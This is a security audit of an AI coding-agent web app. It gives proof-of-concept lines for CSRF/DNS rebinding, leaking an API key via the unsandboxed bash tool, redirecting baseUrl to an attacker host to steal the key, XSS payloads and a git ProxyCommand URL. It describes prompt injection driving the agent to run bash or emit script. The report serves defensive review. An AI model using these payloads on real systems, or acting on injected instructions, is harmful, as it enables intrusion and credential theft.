# pi-work Security Audit — branch `backend` @ 716e29d (2026-10-13)

Independent audit. PoCs were run locally against a fresh clone (Node 22). Unit tests: `npm test` → all pass (0 fail).

## Summary
| # | Severity | Finding |
|---|----------|---------|
| 1 | **Critical** | No auth by default + no Origin/Host check → CSRF / DNS-rebinding from any website (confirmed PoC) |
| 2 | **High** | `bash` tool is unsandboxed: full user privileges, `cd /` escapes workspace, inherits secrets from env (confirmed PoC) |
| 3 | **High** | Local workspaces accept any path, including `/` (confirmed PoC) |
| 4 | **High** | Settings `baseUrl` can be changed while the API key is kept → key exfiltration to an attacker host |
| 5 | Medium | XSS sinks: unescaped `toolName` attribute and `id`s in inline `onclick` handlers (`public/app.js`) |
| 6 | Medium | Git import allows `file://` (clone any local repo) and does not reject hosts starting with `-` |
| 7 | Medium | Recovery: `write`/`edit` are not journaled before they run; a crash can apply `edit` twice. Interrupted `bash` is never re-run (correct), but the model is not clearly told |
| 8 | Medium | Durability is custom SQLite, not `@earendil-works/pi-durable` (the package is a dependency but is used only by `legacy`/`lib`) |
| 9 | Low | TOCTOU between symlink check and write; a symlink created by `bash` can be swapped in |
| 10 | Low | API key stored in plaintext; raw provider error bodies are sent over SSE; masking shows 7 characters |
| 11 | Low | SSE `EventSource` sends no token, so SSE breaks once `PI_WORK_TOKEN` is set (functional bug, and it invites a token-in-URL "fix") |
| 12 | Low | `bash` timeout/abort kills only `/bin/sh`; grandchildren survive. No output size cap |

What is fine: `resolveInWorkspace` correctly blocks `../`, absolute paths, NUL bytes and existing-symlink escapes (PoC). Git clone uses `execFile` with no shell, and the URL is a positional argument, so `--upload-pack` in a URL is inert. Branch values are passed after `--branch`, so they cannot be read as an option. Static file serving checks the path prefix. The Markdown renderer escapes first. Tool input and output are escaped. No CORS headers are set (good). The bearer token compare is timing-safe.

## Details & fixes

### 1. Critical — CSRF / DNS rebinding
`PI_WORK_TOKEN` defaults to empty, so `bearerOk` returns true. `readBody` parses JSON whatever the Content-Type is. A `text/plain` POST is a "simple" request that needs no preflight. PoC: `curl -X POST -H 'Origin: https://evil.example' -H 'Content-Type: text/plain' --data '{"name":"pwn","path":"/"}' /api/workspaces` → **201**. Any web page can therefore create a workspace at `/`, start a conversation, and post a message. The agent may then run `bash`, which amounts to remote code execution through prompt injection. `POST /api/plugins` writes files to disk. A request with `Host: evil.example` is also accepted (DNS rebinding), and it can read everything, including GET responses.
**Fix:** generate a random token on first start (stored in the data dir with mode 0600, printed once) and make it mandatory. Reject requests whose `Host` is not `127.0.0.1:PORT` or `localhost:PORT`. Reject cross-origin `Origin` headers. Require `Content-Type: application/json` for mutations.

### 2. High — bash sandbox
`spawn('/bin/sh',['-c',command],{cwd})` runs with the full environment and full permissions. PoC: `echo $LLM_API_KEY; cd /; pwd` → prints the secret and `/`. The cwd is not a boundary.
**Fix (in order):** pass a minimal `env` allow-list (PATH, HOME=workspace, LANG) and drop `LLM_*` and `PI_WORK_*`. Run inside a sandbox: bubblewrap/nsjail/firejail or a container with the workspace bind-mounted read-write, everything else read-only, and network optional. Add an approval mode for bash. Spawn with `detached:true` and kill the process group (`process.kill(-pid)`). Cap stdout and stderr (e.g. 1 MB).

### 3. High — arbitrary local workspace path
`POST /api/workspaces {path:"/"}` is accepted. Combined with #1, this exposes the whole filesystem to read/write/files API.
**Fix:** allow only paths under configured roots (e.g. `$HOME/projects`, `DATA_DIR/workspaces`). Run `realpath` on the path, and deny `/`, `$HOME`, `~/.ssh` and similar.

### 4. High — key exfiltration via baseUrl
`PUT /api/settings {baseUrl:"https://attacker"}` keeps the stored key, and the next LLM call sends `Authorization: Bearer <key>` to the attacker.
**Fix:** clear the stored key when `baseUrl` or `provider` changes, unless a new key is supplied in the same request. Or bind keys per baseUrl. Optionally keep an allow-list of known providers.

### 5. Medium — XSS
- `data-tool="${toolName}"` (app.js ~L994) is not escaped. The tool name comes from the LLM, so prompt injection can produce `"><img src=x onerror=...>` and run script with API access. **Fix:** `escapeHtml(toolName)`, and validate tool names server-side against the tool registry before emitting `tool.start`.
- `onclick="...('${tool.id}')"`, `('${ws.id}')`, `('${conv.id}')`, `data-role-id="${r.id}"` are not escaped. `tool.id` = `${cid}:${step}`. Ids are server UUIDs today, but role ids come from JSON files. `loadFileOrDiff('${escapeHtml(ch.path)}')` relies on HTML-entity escaping inside a JS string: the browser decodes `&#39;` back to `'` before running the handler, so a file named `x');alert(1);('` **breaks out** of the string and runs. Paths are LLM- and attacker-controlled. **Fix:** remove inline `onclick`. Use `data-*` attributes with escaped values and event delegation (`addEventListener`). Add a CSP of `script-src 'self'` (no `unsafe-inline`) as defence in depth.

### 6. Medium — git import
`file:///any/local/repo` is allowed, so any repo on the box can be cloned into a workspace (and exposed). `ssh://-oProxyCommand=...` passes the validator; modern git blocks it, but the app should too.
**Fix:** allow https (and optionally ssh) only. Reject a host or path beginning with `-`. Insert `--` before the URL. Set `GIT_CONFIG_NOSYSTEM=1`, `-c protocol.file.allow=never`, `-c protocol.ext.allow=never`, `GIT_TERMINAL_PROMPT=0`. Do not echo raw git stderr (it can include credentials embedded in the URL); strip `user:pass@` from stored `gitUrl`.

### 7. Medium — recovery edge cases
- `bash` is marked `started` before it runs. On recovery, a call left `started` becomes `{interrupted:true,"not re-run"}`. So there is **no double execution of bash** (verified in code). Note that pause/stall abort also leaves `started`, so a paused bash is never retried. That is acceptable, but the tool message should say clearly "INTERRUPTED — side effects unknown, check state before retrying", so the model does not assume success.
- `write`/`edit` are only recorded after they finish. A crash between `writeFile` and `upsertToolCall` re-runs them. `write` is idempotent. `edit` is not when `new` contains `old`: it can apply twice. **Fix:** record `started` with the expected `before` hash for every mutating tool. On recovery, compare the file hash: if it already equals `after`, mark the call done. Write atomically (tmp + rename).
- `toolCallId = ${cid}:${step}`: make sure `currentStep` is persisted before the tool runs, otherwise a step-counter rollback could map a new call onto an old completed result and return a stale "duplicate".

### 8. Medium — custom durability vs pi-durable
The new `src/` stack uses its own `node:sqlite` store (`src/store/sqlite.mjs`) and orchestrator. `@earendil-works/pi-durable` is only used by `lib/*` and legacy code. Risks: `node:sqlite` is still experimental (it prints a warning) and the API may change. The custom journal does not handle the write/edit gap (#7) or multi-process locking. It was crash-tested only at the e2e level. Also, the README and package description still claim "基于 Pi Durable". **Recommendation:** either migrate tool execution to pi-durable's task/step semantics, or document the custom design and add: WAL mode plus `busy_timeout`, a single-instance lock file, a schema version or migrations, and property tests that crash at each await point.

### 9. Low — symlink TOCTOU
`resolveInWorkspace` checks first and the write happens later, so a symlink swapped in between (e.g. by a concurrent `bash`) escapes. Moot while #2 exists. **Fix:** open with `O_NOFOLLOW` per component (or `openat2 RESOLVE_BENEATH` through a helper), or re-check `realpath` after the open.

### 10. Low — secrets handling
The key is stored as plaintext JSON in `data/` SQLite. **Fix:** set the file to mode 0600, or use the OS keychain. `maskApiKey` exposes the first 3 and last 4 characters; show the last 4 only. `isMaskedOrEmptyApiKey` treats any value containing `...` or `**` as masked, so a real key with those characters can never be saved (minor). Provider error bodies (`openai.mjs` L82) go verbatim into SSE `error` events and are persisted in `events`; some providers echo part of the key. Truncate and redact them (`sk-[A-Za-z0-9]{6,}` → `sk-***`). No `console.log` of secrets was found.

### 11. Low — SSE auth
`new EventSource(url)` cannot send headers. **Fix:** stream with `fetch()` + ReadableStream carrying the Authorization header, or use a short-lived single-use SSE ticket (`POST /api/sse-ticket` → `?ticket=`). Do not put the long-lived token in the URL.

### 12. Low — process hygiene
See #2: process-group kill and an output cap. Also set `stdin:'ignore'` (already done).
